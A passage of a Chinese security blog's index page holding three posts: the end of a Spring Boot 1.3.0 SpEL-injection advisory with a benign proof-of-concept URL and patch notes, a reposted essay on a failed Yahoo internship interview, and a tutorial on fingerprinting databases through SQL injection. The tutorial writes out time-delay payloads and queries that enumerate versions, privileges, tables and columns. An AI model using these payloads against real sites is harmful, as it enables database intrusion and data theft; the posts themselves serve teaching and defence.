<h4 id="不受影响的版本"><a href="#不受影响的版本" class="headerlink" title="不受影响的版本"></a>不受影响的版本</h4><p>Spring Boot 1.3.1及以上版本</p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>以下是官方给的漏洞说明：<br><img src="/upload_image/3.png" alt=""><br>查看spring boot1.3.0的源文件ErrorMvcAutoConfiguration.java，发现出问题的地方主要在SpelView类中：<br><img src="/upload_image/4.png" alt=""><br>经过分析得知在用户采用了Spring Boot启动Spring MVC项目后Spring Boot的默认异常模板在处理异常信息的时候递归解析SPEL表达式，可导致SPEL表达式注入并执行。主要问题是SpelView类中会对路径中或者名字中含有的表达式递归解析，所以在1.3.1修复时添加了NonRecursivePropertyPlaceholderHelper类，防止递归解析路径中或者名字中含有的表达式。</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>利用此漏洞，只需在SpringMVC的Controller中的参数触发一个异常，异常信息带有SPEL表达式就可以注入了。<br>POC：<br><a href="http://localhost:8555/test.php?id=${new%20java.lang.String(new%20byte[]{78,115,102,111,99,117,115})}" target="_blank" rel="external">http://localhost:8555/test.php?id=${new%20java.lang.String(new%20byte[]{78,115,102,111,99,117,115})}</a><br>漏洞证明：<br><img src="/upload_image/5.png" alt=""><br>利用表达式成功创建了字符串Nsfocus.</p>
<h4 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h4><p>从spring-boot的github的项目中可以看到，这个漏洞是在这个commit中修复的：<br><a href="https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6" target="_blank" rel="external">https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6</a><br>在修复的log里可以看到存着漏洞的1.3.0和1.3.1的差别：<br><img src="/upload_image/6.png" alt=""><br>1.3.1创建了NonRecursivePropertyPlaceholderHelper类，防止递归解析路径中或者名字中含有的表达式。</p>
<h4 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h4><p>升级Spring Boot版本至1.3.1或以上版本</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="http://www.freebuf.com/news/108665.html" target="_blank" rel="external">http://www.freebuf.com/news/108665.html</a><br><a href="http://www.wooyun.org/bugs/wooyun-2010-226888" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-226888</a><br><a href="https://github.com/spring-projects/spring-boot/issues/4763" target="_blank" rel="external">https://github.com/spring-projects/spring-boot/issues/4763</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2016/07/15/Spring-Boot框架SPEL表达式注入漏洞/" data-id="cj5p9bvxb0003d01bfiojm6xa" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="w-面试一年前的自己" class="article article-type-w" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/06/29/面试一年前的自己/" class="article-date">
  <time datetime="2016-06-29T07:20:45.000Z" itemprop="datePublished">2016-06-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/06/29/面试一年前的自己/">面试一年前的自己</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>转自 <a href="http://blog.renren.com/share/110788074/9329803842" target="_blank" rel="external">何巍的日志</a> 一碗不错的鸡汤，看后很有感触，时常拿来读一下。</p>
<h3 id="我在雅虎的面试经历"><a href="#我在雅虎的面试经历" class="headerlink" title="我在雅虎的面试经历"></a>我在雅虎的面试经历</h3><p>我现在还记得，2010年的七月，我在雅虎面试的情景。</p>
<p>雅虎的研发中心是在清华南门外的一座高楼上，我面试的小房间呢，靠着窗户。透过窗户，可以俯瞰美丽的清华园。</p>
<p>一段简短的自我介绍以后，面试官的第一个问题是：你写下快速排序吧。</p>
<p>我脑子一下子懵了，快排是大二时《数据结构》课上学过的，是很基本和经典的算法。可我后来就再也没有用过，需要排序的时候，不是Copy-Paste之前写过的排序代码，就是调用库里的排序函数。我只能记起快排的大致思想了：好像是把数组分成两段，然后再…Oh, Damn!</p>
<p>吭哧了半天，手心都是汗，最后终于写出来了，花了接近二十分钟，当我沮丧地让面试官看我涂涂改改后的代码时，我甚至都不敢确定我写的是“快排”，还是别的什么。</p>
<p>我自然知道面试官的原意：先出一道简单的题，让我很快、很轻松地写出，缓解下紧张的情绪，然后再由易至难。可是，我把这一切从开始就弄砸了。</p>
<p>面试官问我：你知道TLB吧？</p>
<p>我：嗯，知道。</p>
<p>面试官：你说说它的原理：</p>
<p>我(嘀咕着、极小声地、不确定地)：好像和缓存有关吧？？</p>
<p>(心里想着：我上学期学体系结构的时候学过TLB，期末考试前还复习过，考完试后早忘记了。现在又不是期末考试前，我怎么可能还记得住，呜呜…)</p>
<p>面试官：知道段页式存储管理吧？</p>
<p>我：嗯，知道。</p>
<p>面试官：解释下(他递给我一张纸，说你在纸上比划下)</p>
<p>我：…</p>
<p>(心里想着：上学期学《操作系统》的时候我还写过一个操作系统，里面用的就是段页式存储管理。当时还是很明白的东西，怎么才过半年就想不起来了！！)</p>
<p>面试官(很无语、可能抱着最后的一丝希望)：数据库三范式你总知道吧？</p>
<p>我：学过，可是…</p>
<p>面试的结果可想而知。</p>
<p>当我临走的时候，我很不忿地问面试官：我做过一些项目，写过很多代码，你为什么不去问这些项目的经历，或者具体的技术，而是问这些课堂里学过的，可是根本用不到的基础知识？</p>
<p>那个雅虎的面试官，看了看我，给了我一个我这辈子都不会忘记的答案：</p>
<p>你们学校里的做过的那些项目，用过的那些技术，从工业界的角度来看，是小打小闹。你们入职后，技术上都是要重新培训的。而我现在想评估你，只能通过你在学校里学过的基础知识。你作为一个在校的学生，如果这些基础知识你都掌握不好，你说服不了我去雇佣你。</p>
<h3 id="我的简历-Vs-找实习的结果"><a href="#我的简历-Vs-找实习的结果" class="headerlink" title="我的简历 Vs. 找实习的结果"></a>我的简历 Vs. 找实习的结果</h3><p>那时的我的简历是这样的：</p>
<p>清华大学的在读学生，大一、大二、大三学业成绩年级前三，年年奖学金，大二开始进入实验室，到那时已经参加了三个科研项目，并且即将投出人生中的第一篇论文，四、六级都是640左右的成绩。</p>
<p>我自信满满，我以为这是一份很完美无缺的简历，我以为我的同龄人不可能有比我更棒的履历表。</p>
<p>可是，我错了。2010年的夏天，是我第一次去找实习，第一次拿在象牙塔里学到的知识去接受现实社会的考量。我大约面试了六、七家公司吧，被除了IBM以外的所有公司都拒绝了。</p>
<p>拒掉我的公司包括：雅虎、搜狐、网易、创新工场、浪潮…</p>
<p>在最初的一段日子里，我很不解，很疑虑：为什么这样一份看着很棒的简历却不能得到公司的认同？公司里既然不认可我的价值，那么它需要和认可什么样的人才？</p>
<p>很庆幸的是，从那个夏天开始的一年时间里，我有幸先后在IBM和微软两家伟大的公司实习，在顾明老师的指导下完成了一次工作量很大，也非常有收获的毕业设计。这三件事中的每一件，对我来说，都是莫大的挑战，都给了我的认知以全新的甚至是颠覆性的冲击。我对于一年前自己不解的问题逐渐有了更明晰的认识。</p>
<p>现在，当我回首去年夏天的经历的时候，我会毫不犹豫地做出那个雅虎的工程师同样的决定：</p>
<pre><code>如果现在的我去面试一年前的我，我不会去雇佣自己！
</code></pre><p>这就是进步。</p>
<p>在传奇的清华园里，如果横向地看，我只是一个极普通的学生，比起周遭的老师、同学，取得的成绩不值得一提，我更是时常惶恐不安，生怕自己将来能力有限，贡献不大，对不起身上贴着“清华”这个金色的标签。但如果纵向地去看，我能感觉到自己的进步，能感觉到自己成长和探索的步伐。这对于我来说，足以让我内心欣喜和宁静。</p>
<h3 id="我只有学分绩，没有能力"><a href="#我只有学分绩，没有能力" class="headerlink" title="我只有学分绩，没有能力"></a>我只有学分绩，没有能力</h3><p>和园子里的大多数的同学一样，我也是那种在中学的校园里的“尖子”。那时候，似乎有了成绩就有了一切，老师会表扬，同学会羡慕，全校性的集会上会经常有发言的机会，各种的奖励，甚至课间都会有邻班的小女生跑着送来表达爱慕的纸条。</p>
<p>于是，这种思维很自然而然地延续到了我的大学阶段。我每天都在自习室和图书馆里，我想把成绩弄得很高，我依然觉得，有了成绩就会有了一切。</p>
<p>我记得小时候经常写议论文，时常提起的一个话题就是“高分低能”，我记得我写起这个话题，每次都慷慨激昂，痛斥那些在应试教育的体制下培养出的“高分低能”的畸形。可是作文谁都会写，道理谁都会讲。所谓的“高分低能”，那时候，只是说说而已。直到找实习时的碰壁，我才真切意识到，原来议论了这么多年的“高分低能”的人，其实就是自己。</p>
<p>我和学校的老板、公司的老板多次谈过这个话题，现在终于明白：当一个老板考虑是否雇佣你的时候，他不会去在乎你的GPA，不会去在乎你得过的奖学金、他甚至不去关心你做过的社会工作和你参加过的那些项目。他唯一在乎的，就是你的能力和潜能，这决定了你的价值，决定了你可能为公司、为社会创造的价值。</p>
<p>我终于明白：当我们走出象牙塔，踏入社会的时候，我们的核心竞争力，早已不再是成绩，而是能力。</p>
<p>这就是那个雅虎的工程师不愿意雇佣我的原因：我只有学分绩、没有能力。</p>
<p>试想一下，在你的面前有这样的一位求职者：他学过C++，学过JAVA，用过Eclipse和Visual Studio。他写过MFC的程序，也写过JAVA的程序，完成过课堂作业，写过的代码加起来也有几万行吧。可是你和他都明白，这些代码，大都是学生的“自娱自乐”，离工业级的代码相差太远。他学过算法和数据结构，却写个快排算法都吃力。他学过体系结构，却讲不出TLB和段页式存储管理。他学过数据库，却记不起三范式。</p>
<p>虽然他是清华的学生，虽然他的学分绩很高，虽然他还得过奖学金什么的，可是你愿意去相信他有成为一名优秀的软件工程师的能力和潜力吗？你愿意为了他身上这些种种光鲜的“标签”而雇佣他吗？</p>
<p>答案不言自明。</p>
<p>只有能力才能证明自己，只有能力才能创造价值。</p>
<h3 id="我学过计算机专业的核心课吗？"><a href="#我学过计算机专业的核心课吗？" class="headerlink" title="我学过计算机专业的核心课吗？"></a>我学过计算机专业的核心课吗？</h3><p>这个问题似乎很可笑，我都是清华大学研究生一年级的学生呢。早在本科阶段，那些专业核心课，比如操作系统、数据库、算法、计算机网络、编译原理、体系结构都学过了。</p>
<p>而且呢，不仅仅是学过，我还考过很高的成绩呢。呃，我不一一地列举了。写这篇文章的目的本来就是反思，而绝非炫耀。</p>
<p>可是，既然这些计算机专业的核心课我都学过，而且几乎门门都是前10%的成绩，为什么我在雅虎的面试里还表现得像一无所知的儿童一样呢？</p>
<p>我想起了一件事，我学的这些核心课用到的教材几乎都是学校里的书店里淘到二手书。这些书，大都是我的师兄师姐用过的，书里还有他们当时的笔记和圈圈画画。为什么他们会把这些无价的、本该阅读一辈子的书，以一折两折的低价卖给书店呢？我想，肯定不会是这些师兄师姐们都转行去学金融了吧。</p>
<p>我想起了我学过的计算机网络和编译原理这两门课，是的，我都考了99分，是年级第一。可是那些经典的教材，Tanenbaum那本厚厚的《计算机网络》和久负盛名的编译原理龙书，我看过多少，大约15%都不到吧？</p>
<p>理解了多少？估计5%都不到吧，稍微理解多一点也不至于在雅虎面试中表现得那么差。</p>
<p>这些书，这些计算机专业的核心课程，在考试结束之后，就该束之高阁了吗？</p>
<p>今年春天，我在微软做Visual Studio的插件开发，需要用到编译原理里的词法分析、语法分析的知识。我现在还清楚地记得，当我重新学习词法分析和语法分析，学习LR文法时，我看“龙书”的感觉同一个新手无二！</p>
<p>想想真讽刺，这就是我华丽丽地考了99分的计算机专业的核心课。</p>
<p>这些计算机专业的核心课，我都学过。可是从某种意义上来说，我又都没有学过，或者说，学习的过程，不应该随着课程的结束，本科的结束，或者学生时代的结束而停止。这些经典的教材，是需要常读常新的，“温故知新”的过程，理应贯穿整个学生时代和职业生涯。</p>
<h3 id="清华的学生为什么不考证？"><a href="#清华的学生为什么不考证？" class="headerlink" title="清华的学生为什么不考证？"></a>清华的学生为什么不考证？</h3><p>我有很多本科院校相对一般的同学，问起他们在干什么，他们经常告诉我，他们在准备四六级，在考计算机等级证书等等，而且忙得昏天黑地。</p>
<p>可是，在清华的校园里，却没有考证的传统，大部分的同学估计都和我一样，连四、六级都是“裸考”的。我们为什么不像他们那样费尽心机地去考证？</p>
<p>清华给了我们足够的自信，更大的平台和更高的视野，让我们不需要去考那些证书，而可以把时间投入到更宝贵和更值得追求的事上。而且，很功利地说，一张清华大学的毕业证书已经抵过了十张、百张的等级证书。</p>
<p>我们清华的学生为什么不考证？是的，我们不需要去借助那些证书去谋一份好的工作和美好的未来。</p>
<p>换句话说，对于一些普通的工作岗位来说，这些证书或许很值钱。但是对于更高端的工作职位来说，那些证书就没那么有说服力了。这就像你揣着一张计算机等级考试的证书到Google去求职一样可笑。</p>
<p>能靠等级证书找到的工作不会是太好的工作。同样的道理，能靠GPA还有奖学金证书谋到的工作也不会是最好的工作。最好的工作，我们必须而且只能靠能力去说服我们潜在的雇主。</p>
<p>想着我这个年龄时，盖茨在做什么，乔布斯在做什么，想想自己的曾经，还那么迷恋GPA和一些所谓的标签，真真是感到汗颜。16岁的扎克伯格，拒绝了微软95万年薪的工作。当你的能力能证明一切的时候，没有人在乎你的学分绩，没有人在乎你是硕士还是博士还是什么学历都没有。</p>
<p>我想，我应该有这样的志向，靠能力，而不是靠那些所谓的标签，去赢得未来，去为祖国和时代贡献自己的价值。</p>
<h3 id="乔布斯的接力棒"><a href="#乔布斯的接力棒" class="headerlink" title="乔布斯的接力棒"></a>乔布斯的接力棒</h3><p>今天白天的时候，知道了乔布斯去世的消息。我又听了他在Stanford的那次著名的演讲，他在提到自己被苹果公司开除的时候说：</p>
<p>“I felt that I had let the previous generation of entrepreneurs down – that I had dropped the baton as it was being passed to me. ”</p>
<p>如今，乔布斯已经离去了，旧的传奇也在不断老去，新的传奇也在不断地诞生。乔布斯的接力棒(baton)已经传到了我们这一代人的手里。我从不奢望我会是一个改变世界的人物，可是，作为一名未来的IT从业者，我真心地希望能和中国，还有世界上的工程师一样去参与创造和改变这个世界。这是一项最伟大的事业。</p>
<p>我要更努力更有勇气，同乔布斯一样，我也不想让前辈失望。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2016/06/29/面试一年前的自己/" data-id="cj5p9bvxo000bd01biuitex4i" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-sql注入之数据库识别" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/06/18/sql注入之数据库识别/" class="article-date">
  <time datetime="2016-06-18T12:01:05.000Z" itemprop="datePublished">2016-06-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/06/18/sql注入之数据库识别/">sql注入之数据库识别</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>目前，主流扫描器在性能和准确性上一直是各个厂家追捧的对象，然而由于缺少对一些特定环境的判断，例如，数据库的版本识别，页面相似度的计算，爬虫对单 url扫描时间的采样等，所以导致对于一个sql注入的检测势必会采取全规则扫描，那么对于一个数据库怎样去识别呢，我们可以根据所谓的“指纹”去探索， 数据库的类型。</p>
<h4 id="根据数据库连接字符串的不同进行识别"><a href="#根据数据库连接字符串的不同进行识别" class="headerlink" title="根据数据库连接字符串的不同进行识别"></a>根据数据库连接字符串的不同进行识别</h4><p>在控制某个字符串数据项的查询中，可以再一个请求中提交一个特殊的值，然后测试个中连接方式，生成自己想要的字符串，如果得到相同的结果，就可以确定所使 用的数据库类型，如果该页面存在sql注入，当然就是用最简单的测试手法，进行探测，如果探测成功，然后就进行字符的连接测试，对于后台如果一个 url：<a href="http://www.site.com/select.php?a=1&amp;b=2，假设存在注入漏洞，注入点是ｂ，你可以加入一下内容，" target="_blank" rel="external">http://www.site.com/select.php?a=1&amp;b=2，假设存在注入漏洞，注入点是ｂ，你可以加入一下内容，</a> 构造你认为对的注入条件：</p>
<p>a)  字符串类型：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1.   ORACLE：’database‘  || ’_detect‘</div><div class="line">2.   MS-SQL： ’database‘+’_detect‘</div><div class="line">3.   MYSQL：’database‘  ’_detect‘</div></pre></td></tr></table></figure></p>
<p>b)  数字类型<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1.  ORACLE：BITAND(1,1) - BITAND(1,1)</div><div class="line">2.  MS-SQL：@@PACK_RECEIVED - @@PACK_RECEIVED</div><div class="line">3.  MYSQL： CONNECTION_ID() - CONNECTION_ID()</div></pre></td></tr></table></figure></p>
<p>根据页面的返回特征，如果有你想要看到的现象，那么就可以确定数据库的类别。</p>
<h4 id="根据数据库默认函数的不同进行识别"><a href="#根据数据库默认函数的不同进行识别" class="headerlink" title="根据数据库默认函数的不同进行识别"></a>根据数据库默认函数的不同进行识别</h4><p>a)  基于时间的</p>
<ol>
<li>在oracle之中，没有专门的内置时间函数，但是它有一个向远端服务器发送http请求的内置函数，UTL_HTTP,如果发送一个不存在的远端主机请 求，它就会尝试去连接，这样势必会造成一定程度的延迟。</li>
<li>在ms-sql之中，可以使用waitfor delay ‘0:0:10’注入参数之中，造成一定的延迟然后和预期的正常请求时间相比较，如果符合自己的预期，那么就可以确定数据库的类型</li>
<li>在mysql之中，可以使用sleep(5)注入参数之中，造成延迟来判断数据库类型<br>b)  基于错误类型的<br>众所周知对于不同的数据库，如果sql语句触发了错误，它们所爆出来的错误信息是不一样的，当然我们可以试探的形式去发现，例如我们用单引号，双引号，宽字节等有效手段，或者引发除零错之类的触发sql语句的错误，然后从错误信息之中寻找信息<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">1.  ORACLE</div><div class="line">ORA-01756:quoted string not properly terminated</div><div class="line">ORA-00933:SQLcommand not properly ended</div><div class="line">2.  MS-SQL</div><div class="line">Msg 170,level 15, State 1,Line 1</div><div class="line">Line 1:Incorrect syntax near ‘foo</div><div class="line">Msg 105,level 15,state 1,Line 1</div><div class="line">Unclose quotation mark before the character string ‘foo</div><div class="line">3.  MYSQL</div><div class="line">you have an error <span class="keyword">in</span> your SQL syntax,check the manual that corresponds to you mysql server version <span class="keyword">for</span> the right stntax to use near ‘’foo’ at line x</div></pre></td></tr></table></figure>
</li>
</ol>
<p>c)  根据注释也可以初步判断数据库类型，但是注释一般可以被程序过滤，所以严格意义上讲，不在考虑范围之内<br>       这里举例就先这些，其实错误信息很多，如果个事实三者中的任意一个，那么就可以确定是哪一种数据库.</p>
<h4 id="怎样去获取数据库的详细信息"><a href="#怎样去获取数据库的详细信息" class="headerlink" title="怎样去获取数据库的详细信息"></a>怎样去获取数据库的详细信息</h4><p>a)  获取数据库的版本字符串<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1.  ORACLE</div><div class="line">Select banner from v<span class="variable">$version</span></div><div class="line">2.  MS-SQL</div><div class="line">Select @@version</div><div class="line">3.  MYSQL</div><div class="line">Select @@version</div></pre></td></tr></table></figure></p>
<p>b)  获取当前操作的数据库<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">1.  ORACLE</div><div class="line">Select SYS_CONTEXT(‘USERENV’,’DBNAME’) from dual</div><div class="line">2.  MS-SQL</div><div class="line">Select db_name()</div><div class="line">获取服务器的名称可以用 select servername</div><div class="line">3.  MYSQL</div><div class="line">Select database()</div></pre></td></tr></table></figure></p>
<p>c)  获取当前用户的权限<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">1.  ORACLE</div><div class="line">Select privilege from session_privs</div><div class="line">2.  MS-SQL</div><div class="line">Select grantee,table_name,privilege_type from</div><div class="line">INFORMATION_SCHEMA.TABLE_PRIVILEGES</div><div class="line">3.  MYSQL</div><div class="line">Select * from information_schema.user_privileges <span class="built_in">where</span> grantee = ‘user’</div><div class="line">这里的user可以来自select user()</div><div class="line">如果要对这些检索出来的信息，进行一列显示，那么就要用到前面提到的连接符号</div></pre></td></tr></table></figure></p>
<p>d)  显示用户表<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">1.  ORACLE</div><div class="line">Select object_name,object_type,from user_objectsWHEREobject_type=’TABLE’或者显示用户访问的所有表，从其中获取信息</div><div class="line">Select table_name form all_tables</div><div class="line">2.  MS-SQL</div><div class="line">Select name from sysobjectsWHERExtype=’U’</div><div class="line">3.  MYSQL</div><div class="line">Select table_name from information_schema.tables <span class="built_in">where</span> table_type=’BASE TABLE’ and table_schema!=’mysql’</div></pre></td></tr></table></figure></p>
<p>e)  显示表foo的列名称<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1.  ORACLE</div><div class="line">Select column_name,Name form uer_tab_columns <span class="built_in">where</span> table_name = ‘FOO’,如果目标数据部位当前应用程序用户所有，使用ALL_table_columns表</div><div class="line">2.  MS-SQL</div><div class="line">Select column_name,FORM information_schema.columns <span class="built_in">where</span> table_name=’foo’</div><div class="line">3.  MYSQL</div><div class="line">Select column_name from information_schema.columns <span class="built_in">where</span> table_name=’foo’</div></pre></td></tr></table></figure></p>
<p>f)  显示用户对象<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1.  ORACLE</div><div class="line">Select object_name,object_type from user_objects</div><div class="line">2.  MS-SQL</div><div class="line">Select name form sysobjects</div><div class="line">3.  MYSQL</div><div class="line">Select table_name from information_schema.tables或者select trigger_name from information_schema.triggers</div></pre></td></tr></table></figure></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h4><p>如果对于一个存在sql注入的站点来说，前两点可以轻松判断数据库的类型，最后的一点，可以根据实际情况进行sql拼接构造，对一个数据库进行探测</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2016/06/18/sql注入之数据库识别/" data-id="cj5p9bvxn000ad01bavnb8rl4" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">__('next') &raquo;</a>
  </nav>
</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2017/07/18/解密Struts2-POC/">解密Struts2 POC</a>
          </li>
        
          <li>
            <a href="/2017/07/04/甲乙方安全需求与痛点/">甲乙方安全需求与痛点</a>
          </li>
        
          <li>
            <a href="/2016/10/10/Java反序列化漏洞/">序列化和反序列化</a>
          </li>
        
          <li>
            <a href="/2016/09/18/WAF-Bypass-技巧总结/">WAF Bypass 技巧总结</a>
          </li>
        
          <li>
            <a href="/2016/08/11/sqlmap-使用/">sqlmap 使用</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <!--
<footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2017 SY0U<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
-->

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>

  </div>
</body>
</html>